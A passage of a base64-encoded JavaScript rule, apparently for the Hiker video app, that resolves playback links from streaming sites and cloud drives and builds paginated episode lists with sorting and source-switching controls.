lMYXp5ID0gJChcXFxcXFxcIlxcXFxcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxcXG4gICAgICBmdW5jdGlvbiBpc29mZmljaWFsKHVybCkge1xcXFxuICAgICAgICBsZXQgZmxhZyA9IG5ldyBSZWdFeHAoJ3FxXFxcXFxcXFwuY29tfGlxaXlpXFxcXFxcXFwuY29tfHlvdWt1XFxcXFxcXFwuY29tfG1ndHZcXFxcXFxcXC5jb218YmlsaWJpbGlcXFxcXFxcXC5jb218c29odVxcXFxcXFxcLmNvbXxpeGlndWFcXFxcXFxcXC5jb218cHB0dlxcXFxcXFxcLmNvbXxtaWd1dmlkZW9cXFxcXFxcXC5jb218bGVcXFxcXFxcXC5jb218MTkwNVxcXFxcXFxcLmNvbXxmdW5cXFxcXFxcXC50dicpO1xcXFxuICAgICAgICByZXR1cm4gZmxhZy50ZXN0KHVybCk7XFxcXG4gICAgICB9XFxcXG5cXFxcbiAgICAgIGxldCBkcnB5ID0gR00uZGVmaW5lTW9kdWxlKFxcXFxcXFwiZHJweVxcXFxcXFwiLCBcXFxcXFxcImRycHlcXFxcXFxcIik7XFxcXG4gICAgICBpbnB1dCA9IGlucHV0LnNwbGl0KFxcXFxcXFwiI1xcXFxcXFwiKTtcXFxcbiAgICAgIGxldCBwbGF5ID0gSlNPTi5wYXJzZShkcnB5LnBsYXkoaW5wdXRbMV0sIGlucHV0WzBdLnJlcGxhY2UoXFxcXFxcXCJ0dmJveC14ZzpcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIiksIFtdKSk7XFxcXG4gICAgICBsb2cocGxheSlcXFxcbiAgICAgIGxvZyhcXFxcXFxcInBsYXkudXJsXFxcXFxcXCIpXFxcXG4gICAgICBsZXQgcGFyc2Vfb2JqID0ge1xcXFxuICAgICAgICBkZWZfcmVnZXg6IFN0cmluZy5yYXdgXFxcXFxcXFwuKG1wNHxtM3U4KXxjbi90b3NgLFxcXFxuICAgICAgfTtcXFxcblxcXFxuICAgICAgaWYgKHBsYXkudXJsLmluY2x1ZGVzKFxcXFxcXFwicHJveHk/ZG9cXFxcXFxcIikpIHtcXFxcbiAgICAgICAgTVlfVVJMID0gcGxheS51cmw7XFxcXG4gICAgICAgIHBsYXkudXJsID0gZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXFxcXFwidXJsXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpKTtcXFxcbiAgICAgIH1cXFxcbiAgICAgIGlmIChwbGF5LnVybC5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cHM6Ly9wYW4ucXVhcmsuY24vXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vc2VhcmNoP3M9XFxcXFxcXCIgKyBwbGF5LnVybCArIFxcXFxcXFwiJnJ1bGU9dWNra+S6kVxcXFxcXFwiXFxcXG4gICAgICB9XFxcXG4gICAgICBpZiAocGxheS51cmwuc3RhcnRzV2l0aCgnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvJykgfHwgcGxheS51cmwuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBzOi8vd3d3LmFsaXBhbi5jb20vcy9cXFxcXFxcIikpIHtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2FsaXl1bj9ydWxlPeS6keebmOWQmy7nroAmcGFnZT1meXBhZ2UmcmVhbHVybD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChwbGF5LnVybCk7XFxcXG4gICAgICB9XFxcXG4gICAgICBpZiAocGxheS5wYXJzZSA9PT0gMSkge1xcXFxuICAgICAgICBpZiAocGxheS51cmwuc3RhcnRzV2l0aChcXFxcXFxcIm1hZ25ldDpcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICByZXR1cm4gcGxheS51cmw7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKGlzb2ZmaWNpYWwocGxheS51cmwpKSB7XFxcXG4gICAgICAgICAgcmV0dXJuICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9tdWxQYXJzZT9ydWxlPemFjee9ruWKqeaJi1xcXFxcXFwiKS5tdWxQYXJzZShwbGF5LnVybCk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwidmlkZW86Ly9cXFxcXFxcIiArIHBsYXkudXJsO1xcXFxuICAgICAgfSBlbHNlIGlmIChwbGF5LnBhcnNlID09PSAwKSB7XFxcXG4gICAgICAgIHJldHVybiBwbGF5LnVybDtcXFxcbiAgICAgIH1cXFxcbiAgICB9KTsqL1xcXFxuICB9XFxcXG5cXFxcbiAgbGV0IHBsYXlMYXp5ID0gJChcXFxcXFxcIlxcXFxcXFwiKS5sYXp5UnVsZSgoaWQsIHNvdXJjZSkgPT4ge1xcXFxuICAgIHJldHVybiAkLnJlcXVpcmUoXFxcXFxcXCJ2aWRlb1VybFxcXFxcXFwiKS5wYXJzZShpbnB1dCwgaWQsIHNvdXJjZSk7XFxcXG4gIH0sIFxcXFxcXFwiaWRcXFxcXFxcIiwgc291cmNlKTtcXFxcblxcXFxuICBsZXQgcGxheVVybExpc3QgPSBbXTtcXFxcbiAgLy9jb25zb2xlLmxvZyhpbmZvLnZvZF9wbGF5X3VybCk7XFxcXG4gIGxldCBwbGF5cGFnZXMgPSBbXTtcXFxcbiAgaWYgKGluZm8udm9kX3BsYXlfdXJsICYmIGluZm8udm9kX3BsYXlfdXJsICE9IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICBsZXQgY29sID0gXFxcXFxcXCJ0ZXh0XzRcXFxcXFxcIjtcXFxcbiAgICBsZXQgdGV4dGFsaWduID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICBwbGF5VXJsTGlzdCA9IGluZm8udm9kX3BsYXlfdXJsLnNwbGl0KFxcXFxcXFwiJCQkXFxcXFxcXCIpLm1hcCgodCwgaSkgPT4ge1xcXFxuICAgICAgbGV0IGltZyA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgICBsZXQgdHMgPSB0LnNwbGl0KFxcXFxcXFwiI1xcXFxcXFwiKS5tYXAoKGspID0+IGsuc3BsaXQoXFxcXFxcXCIkXFxcXFxcXCIpWzBdKTtcXFxcbiAgICAgIGxldCBwYWdlcyA9ICQuc3BsaXRQYWdlKHRzLmxlbmd0aClcXFxcbiAgICAgIGxldCB0YyA9IGNvdW50VG90YWxCeXRlcyhmaW5kTG9uZ2VzdEVsZW1lbnQodHMpKTtcXFxcbiAgICAgIGlmICh0cy5maWx0ZXIoZSA9PiBlICE9IFxcXFxcXFwiXFxcXFxcXCIpLmxlbmd0aCkge1xcXFxuICAgICAgICBwbGF5cGFnZXNbaV0gPSBwYWdlcztcXFxcbiAgICAgIH1cXFxcbiAgICAgIGlmICh0YyA+IDI0KSB7XFxcXG4gICAgICAgIGNvbCA9IFxcXFxcXFwidGV4dF8xXFxcXFxcXCI7XFxcXG4gICAgICAgIGltZyA9IFxcXFxcXFwiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL3R1Ymlhby9tb3ZpZS8xNDYuc3ZnXFxcXFxcXCI7XFxcXG4gICAgICB9IGVsc2UgaWYgKHRjID49IDEyICYmIHRjIDwgMTUpIHtcXFxcbiAgICAgICAgY29sID0gXFxcXFxcXCJ0ZXh0XzNcXFxcXFxcIjtcXFxcbiAgICAgIH0gZWxzZSBpZiAodGMgPj0gMTUpIHtcXFxcbiAgICAgICAgY29sID0gXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIjtcXFxcbiAgICAgICAgdGV4dGFsaWduID0gXFxcXFxcXCJsZWZ0XFxcXFxcXCI7XFxcXG4gICAgICB9XFxcXG4gICAgICBsZXQgcGxheW9iaiA9IHQuc3BsaXQoXFxcXFxcXCIjXFxcXFxcXCIpLm1hcCgoaikgPT4ge1xcXFxuICAgICAgICBsZXQgayA9IGouc3BsaXQoXFxcXFxcXCIkXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgdCA9IGtbMF07XFxcXG4gICAgICAgIGxldCB1aWQgPSAoa1sxXXx8a1swXSk7XFxcXG4gICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgdGl0bGU6IGZvbnRzdHlsZSh0LCB7XFxcXG4gICAgICAgICAgICB0YWdzOiBcXFxcXFxcInNtYWxsXFxcXFxcXCJcXFxcbiAgICAgICAgICB9KSxcXFxcbiAgICAgICAgICB1cmw6ICB1aWQrIFxcXFxcXFwiI1xcXFxcXFwiICsgZnJvbVtpXSArIHBsYXlMYXp5LnJlcGxhY2UoJ1xcXFxcXFwiaWRcXFxcXFxcIicsICdcXFxcXFxcIicgK3VpZCArICdcXFxcXFxcIicpLFxcXFxuICAgICAgICAgIGNvbF90eXBlOiBjb2wsXFxcXG4gICAgICAgICAgaW1nOiBpbWcsXFxcXG4gICAgICAgICAgLypleHRyYTogT2JqZWN0LmFzc2lnbih7fSwgZXh0cmEsIHtcXFxcbiAgICAgICAgICAgIFxcXFxcXFwiUmVmZXJlclxcXFxcXFwiOiBkZWNvZGVVUklDb21wb25lbnQoa1sxXSksXFxcXG4gICAgICAgICAgICBpZDoga1sxXSxcXFxcbiAgICAgICAgICAgIC8vbGluZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICAgICAgdGV4dEFsaWduOiB0ZXh0YWxpZ24sXFxcXG4gICAgICAgICAgICBjbHM6IFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIixcXFxcbiAgICAgICAgICB9KSovXFxcXG4gICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIGlkOiB1aWQsXFxcXG4gICAgICAgICAgICBibG9ja1J1bGVzOiBbJ2JiLioucG5nJywgJy5qcGcnLCBcXFxcXFxcImhtXFxcXFxcXFwuYmFpZHVcXFxcXFxcXC5jb21cXFxcXFxcXC9obS5qc1xcXFxcXFwiXSxcXFxcbiAgICAgICAgICAgIHZpZGVvRXhjbHVkZVJ1bGVzOiBbJz91cmw9J10sXFxcXG4gICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2UsXFxcXG4gICAgICAgICAgICB0ZXh0QWxpZ246IHRleHRhbGlnbixcXFxcbiAgICAgICAgICAgIGNsczogXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiLFxcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgfTtcXFxcbiAgICAgIH0pO1xcXFxuICAgICAgcGxheW9iaiA9ICQuc3BsaXRBcnJheUJ5UmFuZ2VzKHBsYXlvYmosIHBhZ2VzKTtcXFxcbiAgICAgIHJldHVybiBwbGF5b2JqO1xcXFxuICAgIH0pO1xcXFxuICB9IGVsc2Uge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCJcXFxcbiAgICB9LCB7XFxcXG4gICAgICB0aXRsZTogXFxcXFxcXCLmmoLml6Dmkq3mlL7mupDmiJbmkq3mlL7liJfooajlrprkvY3plJnor69cXFxcXFxcIixcXFxcbiAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgIHVybDogTVlfUEFSQU1TLnZvZElkLFxcXFxuICAgIH0pO1xcXFxuICAgIHNldFJlc3VsdChkKTtcXFxcbiAgfVxcXFxuXFxcXG5cXFxcbiAgbGV0IGN1cnJlbnRMb2NhdGlvbiA9IDA7XFxcXG5cXFxcbiAgZnVuY3Rpb24gcmVub3ZhdGVMaXN0KGxvY2F0aW9uKSB7XFxcXG4gICAgLy9kZWxldGVJdGVtQnlDbHMoXFxcXFxcXCJwbGF5cGFnZVxcXFxcXFwiKTtcXFxcbiAgICBkZWxldGVJdGVtQnlDbHMoXFxcXFxcXCJwbGF5bGlzdFxcXFxcXFwiKTtcXFxcbiAgICBpZiAocGxheVVybExpc3QubGVuZ3RoID09IDApIHtcXFxcbiAgICAgIHJldHVybjtcXFxcbiAgICB9XFxcXG4gICAgbGV0IHBhZ2VudW0gPSBnZXRNeVZhcihcXFxcXFxcInBhZ2VudW1cXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICAgIGxldCBwY291bnQgPSBwbGF5VXJsTGlzdFtsb2NhdGlvbl0ubGVuZ3RoO1xcXFxuICAgIGxldCBsaXN0ID0gcGxheVVybExpc3RbbG9jYXRpb25dW3BhZ2VudW1dO1xcXFxuICAgIGlmICghbGlzdCkge1xcXFxuICAgICAgZm9yIChsZXQgaSA9IHBhZ2VudW07IGkgPj0gMDsgaS0tKSB7XFxcXG4gICAgICAgIGxpc3QgPSBwbGF5VXJsTGlzdFtsb2NhdGlvbl1baV07XFxcXG4gICAgICAgIGlmIChsaXN0KSB7XFxcXG4gICAgICAgICAgcGFnZW51bSA9IGk7XFxcXG4gICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgaWYgKGdldE15VmFyKFxcXFxcXFwic29ydGlcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpID09IDEpIHtcXFxcbiAgICAgIGxpc3QucmV2ZXJzZSgpO1xcXFxuICAgIH1cXFxcbiAgICAkLmV4dGVuZCh7XFxcXG4gICAgICB0ZW1wX2xpc3Q6IHBsYXlVcmxMaXN0W2xvY2F0aW9uXSxcXFxcbiAgICB9KVxcXFxuICAgIGxldCBwbGF5cCA9IHBsYXlwYWdlc1tsb2NhdGlvbl07XFxcXG5cXFxcbiAgICBpZiAocGxheXAgJiYgcGxheXAubGVuZ3RoID4gMSkge1xcXFxuICAgICAgbGV0IHRlbXAgPSB7XFxcXG4gICAgICAgIGNvbF90eXBlOiAndGV4dF8xJyxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICBjbHM6IFxcXFxcXFwicGxheXBhZ2VcXFxcXFxcIlxcXFxuICAgICAgICB9XFxcXG4gICAgICB9XFxcXG4gICAgICBsZXQgcGFnZWFyciA9IHBsYXlwLm1hcCgoeCwgaSkgPT4gaSA9PSBwYWdlbnVtID8gJ+KAnOKAnOKAneKAnScgKyB4LmZvbnRjb2xvcihcXFxcXFxcInJlZFxcXFxcXFwiKSA6IHgpO1xcXFxuICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXFxcXFwicGxheXBhZ2VcXFxcXFxcIilcXFxcbiAgICAgIGFkZEl0ZW1BZnRlcihcXFxcXFxcInBsYXlwYWdlbGluZVxcXFxcXFwiLCBbe1xcXFxuICAgICAgICB0aXRsZTogJ+S4iuS4gOmhtScsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfNFxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgobG9jYXRpb24sIHBjb3VudCkgPT4ge1xcXFxuICAgICAgICAgIGxldCBwYWdlbnVtID0gZ2V0TXlWYXIoXFxcXFxcXCJwYWdlbnVtXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICBpZiAocGFnZW51bSA9PSAwKSB7XFxcXG4gICAgICAgICAgICBwYWdlbnVtID0gcGNvdW50IC0gMTtcXFxcbiAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgcGFnZW51bS0tO1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInBhZ2VudW1cXFxcXFxcIiwgU3RyaW5nKHBhZ2VudW0pKTtcXFxcbiAgICAgICAgICBHTS5nZXQoXFxcXFxcXCJyZW5vdmF0ZUxpc3RcXFxcXFxcIiwgKCkgPT4geyB9KShsb2NhdGlvbik7XFxcXG4gICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICB9LCBsb2NhdGlvbiwgcGNvdW50KSxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICBjbHM6IFxcXFxcXFwicGxheXBhZ2VcXFxcXFxcIlxcXFxuICAgICAgICB9XFxcXG4gICAgICB9LCB7XFxcXG4gICAgICAgIHRpdGxlOiBwbGF5cFtwYWdlbnVtXSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8yXFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJChwYWdlYXJyLCAzKS5zZWxlY3QoKGxvY2F0aW9uKSA9PiB7XFxcXG4gICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJwYWdlbnVtXFxcXFxcXCIsIFN0cmluZyhNWV9JTkRFWCkpO1xcXFxuICAgICAgICAgIEdNLmdldChcXFxcXFxcInJlbm92YXRlTGlzdFxcXFxcXFwiLCAoKSA9PiB7IH0pKGxvY2F0aW9uKTtcXFxcbiAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgfSwgbG9jYXRpb24pLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgIGNsczogXFxcXFxcXCJwbGF5cGFnZVxcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICAgIH0sIHtcXFxcbiAgICAgICAgdGl0bGU6ICfkuIvkuIDpobUnLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzRcXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKGxvY2F0aW9uLCBwY291bnQpID0+IHtcXFxcbiAgICAgICAgICBsZXQgcGFnZW51bSA9IGdldE15VmFyKFxcXFxcXFwicGFnZW51bVxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgaWYgKHBhZ2VudW0gPj0gcGNvdW50IC0gMSkge1xcXFxuICAgICAgICAgICAgcGFnZW51bSA9IDA7XFxcXG4gICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHBhZ2VudW0rKztcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJwYWdlbnVtXFxcXFxcXCIsIFN0cmluZyhwYWdlbnVtKSk7XFxcXG4gICAgICAgICAgR00uZ2V0KFxcXFxcXFwicmVub3ZhdGVMaXN0XFxcXFxcXCIsICgpID0+IHsgfSkobG9jYXRpb24pO1xcXFxuICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgfSwgbG9jYXRpb24sIHBjb3VudCksXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgY2xzOiBcXFxcXFxcInBsYXlwYWdlXFxcXFxcXCJcXFxcbiAgICAgICAgfVxcXFxuICAgICAgfV0pXFxcXG4gICAgICAvKnBsYXlwID0gcGxheXAubWFwKCh4LCBpKSA9PiB7XFxcXG4gICAgICAgICBsZXQgb2JqID0gT2JqZWN0LmFzc2lnbih7fSwgdGVtcCwge1xcXFxuICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAocGFnZW51bSA9PSBpID8geC5mb250Y29sb3IoXFxcXFxcXCJyZWRcXFxcXFxcIikgOiB4KSxcXFxcbiAgICAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxcXG4gICAgICAgICAgICAgaWYgKGdldE15VmFyKFxcXFxcXFwicGFnZW51bVxcXFxcXFwiKSA9PSBpKSB7XFxcXG4gICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJwYWdlbnVtXFxcXFxcXCIsIFN0cmluZyhpKSk7XFxcXG4gICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXFxcXFwicGxheWxpc3RcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgYWRkSXRlbUFmdGVyKFxcXFxcXFwicGxheWxpc3RzXFxcXFxcXCIsICQudGVtcF9saXN0W2ldKTtcXFxcbiAgICAgICAgICAgICBmaW5kSXRlbXNCeUNscyhcXFxcXFxcInBsYXlwYWdlXFxcXFxcXCIpLmZvckVhY2goKHgsIGlpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICBsZXQgdGl0bGUgPSB4LnRpdGxlLnJlcGxhY2UoL+KAmHzigJl84oCcfOKAnXw8W14+XSs+L2csIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgaWYgKGlpID09IGkpIHtcXFxcbiAgICAgICAgICAgICAgICAgdGl0bGUgPSAn4oCc4oCc4oCd4oCdJyArIHRpdGxlLmZvbnRjb2xvcihcXFxcXFxcInJlZFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oeC5leHRyYS5pZCwge1xcXFxuICAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxcXG4gICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICAgICB9LCBpKSxcXFxcbiAgICAgICAgICAgZXh0cmE6IE9iamVjdC5hc3NpZ24oe30sIHRlbXAuZXh0cmEsIHtcXFxcbiAgICAgICAgICAgICBpZDogXFxcXFxcXCJwYWdlbnVtXFxcXFxcXCIgKyBpLFxcXFxuICAgICAgICAgICB9KVxcXFxuICAgICAgICAgfSlcXFxcbiAgICAgICAgIHJldHVybiBvYmo7XFxcXG4gICAgICAgfSlcXFxcbiAgICAgICBhZGRJdGVtQWZ0ZXIoXFxcXFxcXCJwbGF5cGFnZWxpbmVcXFxcXFxcIiwgcGxheXApKi9cXFxcbiAgICB9XFxcXG4gICAgaWYgKGxpc3QpIHtcXFxcbiAgICAgIGFkZEl0ZW1BZnRlcihcXFxcXFxcInBsYXlsaXN0c1xcXFxcXFwiLCBsaXN0KTtcXFxcbiAgICB9XFxcXG4gICAgdXBkYXRlSXRlbShcXFxcXFxcImxvY2F0aW9uQFxcXFxcXFwiICsgY3VycmVudExvY2F0aW9uLCB7XFxcXG4gICAgICB0aXRsZTogZnJvbVtjdXJyZW50TG9jYXRpb25dLFxcXFxuICAgIH0pO1xcXFxuICAgIHVwZGF0ZUl0ZW0oXFxcXFxcXCJsb2NhdGlvbkBcXFxcXFxcIiArIGxvY2F0aW9uLCB7XFxcXG4gICAgICB0aXRsZTogXFxcXFxcXCLigJzigJxcXFxcXFxcIiArIGZyb21bbG9jYXRpb25dICsgXFxcXFxcXCLigJ3igJ1cXFxcXFxcIixcXFxcbiAgICB9KTtcXFxcbiAgICBjdXJyZW50TG9jYXRpb24gPSBsb2NhdGlvbjtcXFxcbiAgfVxcXFxuXFxcXG4gIEdNLnB1dChcXFxcXFxcInJlbm92YXRlTGlzdFxcXFxcXFwiLCByZW5vdmF0ZUxpc3QpO1xcXFxuICBkLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImJpZ19ibGFua19ibG9ja1xcXFxcXFwiXFxcXG4gIH0pO1xcXFxuICBpZiAoZnJvbS5sZW5ndGgpIHtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmlnX2JsYW5rX2Jsb2NrXFxcXFxcXCIsXFxcXG4gICAgfSlcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgdGl0bGU6IHNvcnRvYmpbc29ydGldLFxcXFxuICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChzbykgPT4ge1xcXFxuICAgICAgICBsZXQgc2kgPSBnZXRNeVZhcihcXFxcXFxcInNvcnRpXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IGlpID0gKHNpID09IFxcXFxcXFwiMFxcXFxcXFwiID8gXFxcXFxcXCIxXFxcXFxcXCIgOiBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgIHVwZGF0ZUl0ZW0oXFxcXFxcXCJAc29ydFxcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgdGl0bGU6IHNvW2lpXVxcXFxuICAgICAgICB9KVxcXFxuICAgICAgICB2YXIgcGxheXMgPSBmaW5kSXRlbXNCeUNscyhcXFxcXFxcInBsYXlsaXN0XFxcXFxcXCIpLnJldmVyc2UoKS5tYXAoeCA9PiB7XFxcXG4gICAgICAgICAgeC5jb2xfdHlwZSA9IHgudHlwZTtcXFxcbiAgICAgICAgICByZXR1cm4geDtcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhcXFxcXFxcInBsYXlsaXN0XFxcXFxcXCIpO1xcXFxuICAgICAgICBhZGRJdGVtQWZ0ZXIoXFxcXFxcXCJwbGF5bGlzdHNcXFxcXFxcIiwgcGxheXMpO1xcXFxuXFxcXG4gICAgICAgIHB1dE15VmFyKFxcXFxcXFwic29ydGlcXFxcXFxcIiwgaWkpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICB9LCBzb3J0b2JqKSxcXFxcbiAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXG4gICAgICBleHRyYToge1xcXFxuICAgICAgICBpZDogXFxcXFxcXCJAc29ydFxcXFxcXFwiLFxcXFxuICAgICAgfVxcXFxuICAgIH0pXFxcXG4gICAgZm9yIChsZXQgaSBpbiBmcm9tKSB7XFxcXG4gICAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogZnJvbVtpXSxcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKGksIGlkKSA9PiB7XFxcXG4gICAgICAgICAgaWYgKGdldE15VmFyKGlkICsgXFxcXFxcXCJzb3VyY2VpXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKSA9PSBpKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICAgIHB1dE15VmFyKGlkICsgXFxcXFxcXCJzb3VyY2VpXFxcXFxcXCIsIFN0cmluZyhpKSk7XFxcXG4gICAgICAgICAgR00uZ2V0KFxcXFxcXFwicmVub3ZhdGVMaXN0XFxcXFxcXCIsICgpID0+IHsgfSkoaSk7XFxcXG4gICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICB9LCBpLCBpZCksXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgaWQ6IFxcXFxcXFwibG9jYXRpb25AXFxcXFxcXCIgKyBpXFxcXG4gICAgICAgIH0sXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInNjcm9sbF9idXR0b25cXFxcXFxcIlxcXFxuICAgICAgfSk7XFxcXG4gICAgfVxcXFxuICB9XFxcXG4gIC8vY29uc29sZS5sb2cocGxheVVybExpc3QpO1xcXFxuICAvKmlmIChwbGF5VXJsTGlzdC5sZW5ndGgpIHtcXFxcbiAgICB2YXIgZWpvYmogPSB7XFxcXG4gICAgICBcXFxcXFxcImxpc3RcXFxcXFxcIjogcGxheVVybExpc3QsXFxcXG4gICAgICBcXFxcXFxcInRhYlxcXFxcXFwiOiBmcm9tLm1hcCgoeCwgaSkgPT4gZnJvbVtpXSlcXFxcbiAgICB9O1xcXFxuICAgIOWIneWni+WMlihkLCBlam9iailcXFxcbiAgfSBlbHNlIHtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgdGl0bGU6IFxcXFxcXFwi5pqC5peg5pKt5pS+5rqQXFxcXFxcXCIsXFxcXG4gICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzNcXFxcXFxcIixcXFxcbiAgICAgIHVybDogTVlfUEFSQU1TLnZvZElkLFxcXFxuICAgIH0pO1xcXFxuICB9Ki9cXFxcblxcXFxuICBkLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgIGlkOiBcXFxcXFxcInBsYXlwYWdlbGluZVxcXFxcXFwiXFxcXG4gICAgfVxcXFxuICB9KVxcXFxuXFxcXG5cXFxcbiAgZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgIGlkOiBcXFxcXFxcInBsYXlsaXN0c1xcXFxcXFwiXFxcXG4gICAgfVxcXFxuICB9KTtcXFxcblxcXFxuICBkLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXF